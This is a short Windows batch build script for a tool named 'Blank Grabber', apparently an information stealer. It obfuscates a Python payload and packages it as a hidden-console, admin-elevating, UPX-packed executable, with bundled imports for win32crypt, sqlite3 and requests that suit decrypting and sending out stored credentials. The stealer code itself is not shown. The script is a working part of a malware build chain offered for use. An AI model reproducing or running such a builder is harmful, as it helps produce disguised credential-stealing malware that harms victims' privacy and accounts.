@echo off
if not exist activate.bat exit
title Obfuscating...
python ooo.py
title Converting to exe...
goto convert
:icon
pyinstaller --onefile --noconsole --noconfirm --uac-admin --upx-dir="./UPX" main-o.py --name "Blank Grabber" --icon icon.ico --clean --hidden-import=psutil --hidden-import=glob --hidden-import=requests --hidden-import=sqlite3 --hidden-import=win32crypt --add-data "structc.pyd;." --hidden-import=filecmp
goto done
:noicon
pyinstaller --onefile --noconsole --noconfirm --uac-admin --upx-dir="./UPX" main-o.py --name "Blank Grabber" --clean --hidden-import=psutil --hidden-import=glob --hidden-import=requests --hidden-import=sqlite3 --hidden-import=win32crypt --add-data "structc.pyd;." --hidden-import=filecmp
goto done
:convert
if exist icon.ico goto icon
goto noicon
:done
python idk.py
cls
explorer.exe dist
exit